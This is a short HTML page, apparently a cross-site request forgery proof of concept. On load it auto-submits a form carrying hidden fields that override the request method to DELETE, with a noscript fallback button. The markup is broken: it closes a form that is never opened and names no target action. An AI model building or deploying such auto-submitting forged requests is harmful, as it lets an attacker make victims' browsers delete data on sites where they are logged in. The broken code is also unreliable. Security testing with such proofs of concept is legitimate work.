<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CSRF PoC — method override</title>
  </head>
  <body onload="document.forms[0].submit()">

      <input type="hidden" name="_method" value="DELETE">
      <!-- alternate header-style override (server may accept as param) -->

      <!-- include "body" placeholder; server-specific -->
      <input type="hidden" name="payload" value="{}">
      <noscript>
        <p>Javascript disabled — click the button to submit the PoC.</p>
        <button type="submit">Submit</button>
      </noscript>
    </form>
  </body>
</html>
